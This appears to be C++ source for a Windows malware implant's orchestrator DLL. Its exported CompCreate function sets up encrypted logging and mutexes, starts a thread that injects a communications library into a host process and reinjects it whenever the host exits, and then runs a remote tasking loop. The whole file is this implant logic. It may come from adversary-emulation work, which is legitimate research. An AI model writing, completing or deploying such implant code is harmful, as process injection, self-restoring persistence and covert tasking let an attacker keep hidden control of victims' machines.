#include <windows.h>
#include <iostream>
#include <conio.h>
#include <thread>
#include <map>
#include <functional>
#include "../include/orchestrator.h"
#include "../include/injection.h"
#include "../include/mutex.h"
#include "../include/tasking.h"
#include "../include/util.h"

extern "C" {
    __declspec(dllexport) void __stdcall CompCreate() {
        injection::InjectionCallWrapper i_call_wrapper;
        tasking::TaskingCallWrapper t_call_wrapper;
        int retVal;
        std::string location = "";
        // flag for if there is a running comms lib or not
        // controlled by injection manager
        // watched by tasking, tasking pauses when false
        orchestrator::commsActiveFlag = FALSE;
        orchestrator::logMutexFlag = FALSE;

        try {
            
            // Populate the 'global' variables that other parts of the orchestrator will use
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Populating config values");
            location = "startup";
            retVal = orchestrator::PopulateConfigValues();
            if (retVal != ERROR_SUCCESS) {
                // output error to log
                util::logEncrypted(orchestrator::defaultErrorLogPath, "[ERROR-MAIN] PopulateConfigValues failed with error: " + retVal);
                return;
            }
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Completed populating config values");

            // Create mutexes for orchestrator and comms lib to manage file access with
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Creating mutexes");
            location = "mutex";
            retVal = mutex::MutexManager();
            if (retVal != ERROR_SUCCESS) {
                // output error to log
                util::logEncrypted(orchestrator::defaultErrorLogPath, "[ERROR-MAIN] Mutex creation failed with error: " + retVal);
                return;
            }

            orchestrator::logMutexFlag = TRUE;
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Completed creating mutexes");

            // Spawn thread to inject comms lib, will reinject if host exits
            // thread so that we can watch for the host to exit at the same time as doing the tasking loop
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Starting injection loop");
            location = "injection";
            std::thread inj(injection::InjectionManager, &i_call_wrapper);

            // Start tasking loop
            util::logEncrypted(orchestrator::defaultRegLogPath, "[MAIN] Starting tasking loop");
            location = "tasking";
            retVal = tasking::TaskingManager(&t_call_wrapper);
            if (retVal != ERROR_SUCCESS) {
                // output error to log
                util::logEncrypted(orchestrator::defaultErrorLogPath, "[ERROR-MAIN] Tasking failed with error: " + retVal);
                return;
            }

        } catch (const std::exception& e) {
            // if the orchestrator crashes, we might be able to use this to diagnose where it had an oopsies
            util::logEncrypted(orchestrator::defaultErrorLogPath, "[ERROR-MAIN] Main encountered critical error in " + location + ": " + std::string(e.what()));
            return;
        }
    }
}